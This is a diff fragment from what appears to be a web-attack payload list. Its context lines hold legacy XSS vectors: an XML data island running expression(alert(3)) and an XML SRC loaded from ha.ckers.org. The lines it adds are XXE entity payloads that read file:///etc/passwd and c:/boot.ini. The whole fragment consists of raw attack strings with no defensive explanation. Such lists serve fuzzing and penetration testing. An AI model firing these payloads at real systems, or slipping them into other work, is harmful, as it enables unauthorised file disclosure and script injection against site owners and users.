@@ -7,4 +7,7 @@
 <xml id=cdcat><note><to>%26lt;span style=x:exp<![CDATA[r]]>ession(alert(3))%26gt;hello%26lt;/span%26gt;</to></note></xml><table border=%221%22 datasrc=%22%23cdcat%22><tr><td><span datafld=%22to%22 DATAFORMATAS=html></span></td></tr></table>
 [<!ENTITY nbsp "'">]
 <XML SRC="http://ha.ckers.org/xsstest.xml" ID=I></XML>
+<!ENTITY % three SYSTEM "file:///etc/passwd">
+<!ENTITY % two "<!ENTITY % four SYSTEM 'file:///%three;'>">
+<!DOCTYPE	html[	<!ENTITY	%	foo	SYSTEM	"file:///c:/boot.ini">	%foo;]>	
 /* RFI END */
